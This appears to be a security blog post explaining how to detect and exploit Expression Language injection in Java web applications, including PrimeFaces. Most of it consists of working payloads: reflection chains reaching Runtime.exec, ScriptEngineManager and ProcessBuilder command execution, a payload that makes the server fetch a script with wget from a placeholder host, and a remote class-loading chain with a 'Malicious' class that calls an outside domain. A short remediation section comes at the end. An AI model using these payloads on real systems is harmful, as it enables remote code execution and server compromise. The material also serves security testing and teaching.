---
title: Remote Code execution with EL Injection Vulnerabilities
---
## Abstract

This post defines a methodology for detecting and exploiting EL injection.

## Introduction

An expression language makes it possible to easily access application data. For example, the JSP expression language allows a page author to access a bean using simple syntax such as ${name} for a simple variable [1].

EL Injection occurs when user input is embedded in an unsafe manner. EL Injection are very serious and lead to complete compromise of the application&#39;s data and functionality and often obtain Remote Code Execution (RCE), turning every vulnerable application into a potential pivot point. Also EL Injection can be used to bypass input filters and any HttpOnly protection for application pages vulnerable to cross-site scripting (XSS) [2].

## The core problem

To demonstrate the vulnerability. We have two test cases.

In first test case we created simple demo application running in windows environment which is vulnerable to EL injection. Whereas, in second test case we exploit a real world application running in Linux environment which is vulnerable to EL injection.

The main difference between the two test cases are

First test case help us to understand Expression language. We can see an error messages and stack trace which help us to develop our payload.

However, in second test case we demonstrate some tricks how an attacker can still develop a working payload and get remote code execution in black box if he cannot see any error message or stack trace.

## First vulnerable Application

Suppose the following lines of Code are found in an application.

1. index.xhtml gets &quot;name&quot; parameter from the request and sends it to bingo():

  ![](https://github.com/adam-p/markdown-here/raw/master/src/common/images/icon48.png )

**Figure 1:** Vulnerable JSF application

1. Bing() evaluates argument dynamically and echo the value of &quot;name&quot; request parameter to the browser

 ![](https://github.com/adam-p/markdown-here/raw/master/src/common/images/icon48.png )

**Figure 2:** Java bean code vulnerable to EL injection

 
1. Example, the get request with parameter &quot;name=&quot; is sent and its value is echo in page.

  ![](https://github.com/adam-p/markdown-here/raw/master/src/common/images/icon48.png )

**Figure 3**. Application get user input from name parameter and echo back in page.



## Detect &amp; Identify

In a black box testing scenario finding these vulnerabilities can be done by sending valid EL.

Such as:

-   ${&quot;aaaa&quot;} (the literal string &quot;aaaa&quot;) and then searching the response text for such data.
-   ${99999+1} and then searching the response text for 100000.
-   #{7+7} or ${{7\*7}} and then searching the response text for 49.

  ![](https://github.com/adam-p/markdown-here/raw/master/src/common/images/icon48.png )

**Figure 4.** black box testing scenario finding EL Injection

In above example, anything between expression delimiters {{ }} will be evaluated, and that&#39;s what we are more interested in.

Once it is confirmed that anything between expression delimiters is evaluated from this point we can send payloads to start gathering more information.

**Convert string to Uppercase:**
<pre>
```EL
Payload: ${{'abc'.toUpperCase()}}
Output: ABC
```
</pre>

**Concatenate two strings:**
```
Payload: ${{'abc'.concat('def')}} 
Output: abcdef
```

**Get the class name of string:**
```
Payload: ${{'a'.getClass()}} 

Output: java.lang.String
```
 

There are some built in variables such as **{{ request }}**, **{{ session }}**,**{{ faceContex }}**

**Get the class of request object:**
```
Payload: ${{ request }}

Output: [org.apache.catalina.connector.RequestFacade@316732da]
```


**Get the class of session object:**
```
Payload: ${{ session }}

[org.apache.catalina.session.StandardSessionFacade@5e19c3de]
```
From this point we have some information regarding application we can start testing some functionality.



**Can we modify an object?**
```
Payload: ${{request.setAttribute(&quot;r&quot;,&quot;abc&quot;)}}  ${{request.getAttribute(&quot;r&quot;)}}

Output: abc
```
Object modification is possible which might be a big risk.

We know about Expression language how it works, the goal is to write payload to get remote code execution.  We can use forName() newInstance() Methods to get an instance of class dynamically.

Using string &#39;a&#39; to get an instance of class Java.net.Socket -
```
Payload: ${{&quot;a&quot;,&quot;&quot;.getClass().forName(&quot;java.net.Socket&quot;).newInstance()}}
Output: [a, Socket[unconnected]]
```


An example payload to create array object using  forName() newInstance() Methods.
```
${request.setAttribute(&quot;a&quot;,&quot;&quot;.getClass().forName(&quot;java.util.ArrayList&quot;).newInstance())}

${request.getAttribute(&quot;a&quot;).add(&quot;hello&quot;)}

${request.getAttribute(&quot;a&quot;)}
```
From this point we can now Just create an object of java.lang.Runtime class and call the exec() method on it.
```
Payload: ${{&#39;a&#39;.getClass().forName(&#39;java.lang.Runtime&#39;).newInstance()}}

Class javax.el.BeanELResolver can not access a member of class java.lang.Runtime with modifiers &quot;private&quot;
```
**Fail**, Calling the newInstance()  method on java.lang.Runtime class is not allowed.

 
Our next try is to create a new Runtime using reflection.

 
```
Payload: ${&quot;&quot;.getClass().forName(&quot;java.lang.Runtime&quot;).getMethods()[6].invoke(&quot;&quot;.getClass().forName(&quot;java.lang.Runtime&quot;)).exec(&quot;calc.exe&quot;)}
```
Output: BOOM!!!

  ![](https://github.com/adam-p/markdown-here/raw/master/src/common/images/icon48.png )

Here is another payload using reflection to create a new Runtime but using getDeclaredConstructors method.
```
${{session.setAttribute(&quot;rtc&quot;,&quot;&quot;.getClass().forName(&quot;java.lang.Runtime&quot;).getDeclaredConstructors()[0])}}

${{session.getAttribute(&quot;rtc&quot;).setAccessible(true)}}

${{session.getAttribute(&quot;rtc&quot;).getRuntime().exec(&quot;/bin/bash -c whoami&quot;)}}
```
In next section we will demonstrate another difficult example how we can construct a malicious payload in black box. If we cannot see error messages and stack trace log. If we cannot create Runtime object. What else we can do to achieve remote code execution in target.



## Second vulnerable Application

The vulnerable application which we are testing does not return any error or stack trace. Our second vulnerable application is using java Prime Faces library. Prime Faces had an EL Injection Vulnerability in older versions till 5.2.21 / 5.3.8 / 6.0

Since in this case we cannot see any error message or output of data we cannot know if our payload is working or not. After reading some documentation of Prime Faces we found out that we can set custom response header and in the value of that custom response header we can try to echo our payload result.

In this case the payload we have chosen is:

// Set a response Header with a value of &quot;output&quot; Request Parameter
```
${facesContext.getExternalContext().setResponseHeader(&quot;output &quot;,request.getParameter(&quot;output &quot;))}
```
  ![](https://github.com/adam-p/markdown-here/raw/master/src/common/images/icon48.png )

The application is vulnerable because of the new added response header.

Now we can also try to get the class of request object
```
Payload: ${facesContext.getExternalContext().setResponseHeader(&quot;output&quot;,request)}
```
 
  ![](https://github.com/adam-p/markdown-here/raw/master/src/common/images/icon48.png )

 
## Payloads

To get current directory path we can sent payload
```
request.getServletContext().getResource(&quot;/&quot;)

output: In response we will get full path of application
```
Here I will share some EL injection payloads to get remote code execution in java application.

**Method 1** using **ScriptEngineManager** class to execute external command.
```
${facesContext.getExternalContext().setResponseHeader(&quot;output&quot;, &quot;&quot;.getClass().forName(&quot;javax.script.ScriptEngineManager&quot;).newInstance().getEngineByName(&quot;JavaScript&quot;).eval(\&quot;var x=new java.lang.ProcessBuilder; x.command(\\\&quot;wget\\\&quot;,\\\&quot;http://x.x.x.x/1.sh\\\&quot;); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\&quot;))}
```
**Method 2** using **processbuilder** class to execute external command.
```
${request.setAttribute(&quot;c&quot;,&quot;&quot;.getClass().forName(&quot;java.util.ArrayList&quot;).newInstance())}

${request.getAttribute(&quot;c&quot;).add(&quot;cmd.exe&quot;)}

${request.getAttribute(&quot;c&quot;).add(&quot;/k&quot;)}

${request.getAttribute(&quot;c&quot;).add(&quot;ping x.x.x.x&quot;)}

${request.setAttribute(&quot;a&quot;,&quot;&quot;.getClass().forName(&quot;java.lang.ProcessBuilder&quot;).getDeclaredConstructors()[0].newInstance(request.getAttribute(&quot;c&quot;)).start())}

${request.getAttribute(&quot;a&quot;)}
```
**Method 3**. One liner using **scriptEngineManager** class
```
${request.getClass().forName(&quot;javax.script.ScriptEngineManager&quot;).newInstance().getEngineByName(&quot;js&quot;).eval(&quot;java.lang.Runtime.getRuntime().exec(\\\&quot;ping loveuj.offsec-x.x.x.x\\\&quot;)&quot;))}&#39;
```
**Method 4.** Using **Runtime** class to execute external command.

 
```
#{session.setAttribute(&quot;rtc&quot;,&quot;&quot;.getClass().forName(&quot;java.lang.Runtime&quot;).getDeclaredConstructors()[0])}

#{session.getAttribute(&quot;rtc&quot;).setAccessible(true)}

#{session.getAttribute(&quot;rtc&quot;).getRuntime().exec(&quot;/bin/bash –c whoami&quot;)}
```
 

**Method 5**. Using **reflection &amp; invoke** to execute external command
```
${&quot;&quot;.getClass().forName(&quot;java.lang.Runtime&quot;).getMethods()[6].invoke(&quot;&quot;.getClass().forName(&quot;java.lang.Runtime&quot;)).exec(&quot;calc.exe&quot;)}
```


**Method 6.**** Load Malicious.class** from remote URL [3]




```
${request.setAttribute(&quot;a&quot;,&quot;&quot;.getClass().forName(&quot;java.util.ArrayList&quot;).newInstance())}

payloadEL += &#39;${request.getAttribute(&quot;a&quot;).add(request.getServletContext().getResource(&quot;/&quot;).toURI().create(&quot;http://x.x.x.x:8080/&quot;).toURL())}&#39;

payloadEL += &#39;${request.setAttribute(&quot;b&quot;,request.getClass().getClassLoader().getParent().newInstance(request.getAttribute(&quot;a&quot;).toArray(request.getClass().getClassLoader().getParent().getURLs())).loadClass(&quot;Malicious&quot;).newInstance())}&#39;

payloadEL += &#39;${facesContext.getExternalContext().setResponseHeader(&quot;output&quot;, request.getAttribute(&quot;b&quot;).bang())}&#39;
```

Malicious.java
```java
public class Malicious {

       public static void bang() {
              try {
		    System.out.println("Program Started Khanisgr8 P Exploit...");
		
                     java.lang.Runtime.getRuntime().exec(new String[]{"wget","http://exploit.dns.tssrt.de"}); //Mac
                    
              } catch (Exception e) {    

			System.out.println("Error Program Started Khanisgr8 P Exploit...");

              }
       }
}

```


 
## Remediation

Whenever possible, applications should avoid incorporating user-controllable data into dynamically evaluated code. In almost every situation, there are safer alternative methods of implementing application functions, which cannot be manipulated to inject arbitrary code into the server&#39;s processing.

If it is considered unavoidable to incorporate user-supplied data into dynamically evaluated code, then the data should be strictly validated. Ideally, a whitelist of specific accepted values should be used. Otherwise, only short alphanumeric strings should be accepted. Input containing any other data, including any conceivable code metacharacters, should be rejected.[7]


# References:

1. [https://docs.oracle.com/javaee/1.4/tutorial/doc/JSPIntro7.html](https://docs.oracle.com/javaee/1.4/tutorial/doc/JSPIntro7.html)
2. [https://www.mindedsecurity.com/fileshare/ExpressionLanguageInjection.pdf](https://www.mindedsecurity.com/fileshare/ExpressionLanguageInjection.pdf)
3. [http://danamodio.com/appsec/research/spring-remote-code-with-expression-language-injection/](http://danamodio.com/appsec/research/spring-remote-code-with-expression-language-injection/)
4. [https://www.betterhacker.com/2018/12/rce-in-hubspot-with-el-injection-in-hubl.html](https://www.betterhacker.com/2018/12/rce-in-hubspot-with-el-injection-in-hubl.html)
5. [https://www.primefaces.org/primefaces-el-injection-update/](https://www.primefaces.org/primefaces-el-injection-update/)
6. [https://portswigger.net/kb/issues/00100f20\_expression-language-injection](https://portswigger.net/kb/issues/00100f20_expression-language-injection)
